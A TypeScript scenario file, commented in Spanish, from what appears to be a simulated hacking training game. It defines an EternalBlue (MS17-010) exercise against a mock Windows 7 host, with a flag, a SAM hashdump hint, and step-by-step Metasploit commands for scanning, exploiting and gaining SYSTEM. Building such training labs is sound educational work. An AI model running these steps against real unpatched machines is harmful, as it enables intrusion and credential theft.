// ── exercises/exercise03.ts ───────────────────────────────────────
// Scenario 3 — EternalBlue / MS17-010 Windows 7
// Datos y configuración específicos para este escenario

import { buildScenario, COMMON_PORTS, createFile, createWebDirs } from './templates';
import type { Scenario } from '../types';

// Re-exportar resetAttackerCounter desde templates para compatibilidad
export { resetAttackerCounter } from './templates';

// Template específico para EternalBlue
export const SCENARIO_TEMPLATES_ETERNAL = {
  eternalBlue: () => ({
    id: 'scenario-03',
    name: 'EternalBlue — MS17-010',
    description: 'Explotación EternalBlue en Windows 7 sin parchear mediante Metasploit.',
    difficulty: 'Medium' as const,
    category: 'Network' as const,
    networkRange: '172.16.0.0/24',
    targetMachine: {
      id: 'win7-target',
      machine_info: {
        hostname: 'WIN7-TARGET',
        mac: '08:00:27:C4:D5:E6',
        os: 'Windows 7 Professional SP1 x64',
        status: 'up' as const,
        type: 'workstation',
      },
      discovery_level: 0,
      scan_results: { ports: [] },
      learning_steps: [],
      ports: [
        COMMON_PORTS.smb('Windows 7 Professional 7601 Service Pack 1'),
        { port: 135, protocol: 'tcp', state: 'open', service: 'msrpc', version: 'Microsoft Windows RPC' },
        { port: 139, protocol: 'tcp', state: 'open', service: 'netbios-ssn', version: 'Microsoft Windows netbios-ssn' },
        { port: 49152, protocol: 'tcp', state: 'open', service: 'msrpc', version: 'Microsoft Windows RPC' },
      ],
      web_enumeration: {
        web_server: 'none',
        cms: 'none',
        directories: [],
      },
      files: [
        createFile('C:\\\\Users\\\\Administrator\\\\Desktop\\\\flag.txt', 'THM{ETERNALBLUE_SYSTEM_PWNED}'),
        createFile('C:\\\\Windows\\\\System32\\\\config\\\\SAM', '[SAM Database — use hashdump]', 'binary'),
      ],
    },
    learningSteps: [
      { task: 'Reconocimiento de red', text: 'Descubrir hosts: arp-scan <network/cidr>', discoveryLevel: 1 },
      { task: 'Escaneo de puertos', text: 'Identificar servicios: nmap -sV <target-ip>', discoveryLevel: 2 },
      { task: 'Verificar vulnerabilidad', text: 'msfconsole: use auxiliary/scanner/smb/smb_ms17_010 → set RHOSTS → run', discoveryLevel: 2 },
      { task: 'Explotar EternalBlue', text: 'use exploit/windows/smb/ms17_010_eternalblue → set RHOSTS/LHOST → exploit', discoveryLevel: 3 },
      { task: 'Verificar acceso SYSTEM', text: 'meterpreter: getuid', discoveryLevel: 4 },
    ],
  }),
};

export const scenario_03: Scenario = buildScenario(SCENARIO_TEMPLATES_ETERNAL.eternalBlue());
